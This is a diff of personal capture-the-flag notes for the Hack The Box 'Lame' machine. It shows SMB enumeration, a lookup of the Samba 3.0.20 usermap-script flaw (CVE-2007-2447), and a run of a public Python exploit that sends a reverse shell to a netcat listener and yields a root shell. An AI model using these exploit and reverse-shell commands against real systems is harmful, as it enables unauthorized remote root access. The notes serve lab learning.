@@ -96,6 +96,28 @@ SMB         lame.htb        445    LAME             [*] Unix (name:LAME) (domain
 
 (lame server (Samba 3.0.20-Debian)) tells me to lookup 3.0.20 in searchsplit?
 
+### tmp
+```
+smbclient //lame.htb/tmp    
+Password for [WORKGROUP\kali]:
+Anonymous login successful
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Thu Mar  2 00:06:33 2023
+  ..                                 DR        0  Sat Oct 31 03:33:58 2020
+  .ICE-unix                          DH        0  Wed Mar  1 23:25:04 2023
+  vmware-root                        DR        0  Wed Mar  1 23:26:15 2023
+  .X11-unix                          DH        0  Wed Mar  1 23:25:29 2023
+  .X0-lock                           HR       11  Wed Mar  1 23:25:29 2023
+  vqeu                                N        0  Thu Mar  2 00:04:31 2023
+  5573.jsvc_up                        R        0  Wed Mar  1 23:26:15 2023
+  vgauthsvclog.txt.0                  R     1600  Wed Mar  1 23:25:03 2023
+
+                7282168 blocks of size 1024. 5385800 blocks available
+```
+
+Nothing really??
+
 ## Searchsploit
 ```
  searchsploit samba 3.0.20                                                      
@@ -111,7 +133,9 @@ Shellcodes: No Results
 ```
 
 16320.rb looks interesting 
+Samba 3.0.0 - 3.0.25rc3 has Remote Code Injection Vuln
 
+https://www.exploit-db.com/exploits/16320
 # Foothold
 ## Metasploit
 
@@ -169,3 +193,27 @@ vnc.log
 ```
 
 done???
+
+# No metasploit
+## Python script
+https://github.com/amriunix/CVE-2007-2447
+
+download pysmb
+
+![[Pasted image 20230302145003.png]]
+
+## Exploit
+```
+python3 usermap_script.py lame.htb 139 10.10.14.39 1234
+[*] CVE-2007-2447 - Samba usermap script
+[+] Connecting !
+[+] Payload was sent - check netcat !
+```
+
+```
+ nc -lnvp 1234
+listening on [any] 1234 ...
+connect to [10.10.14.39] from (UNKNOWN) [10.129.219.210] 40796
+whoami
+root
+```
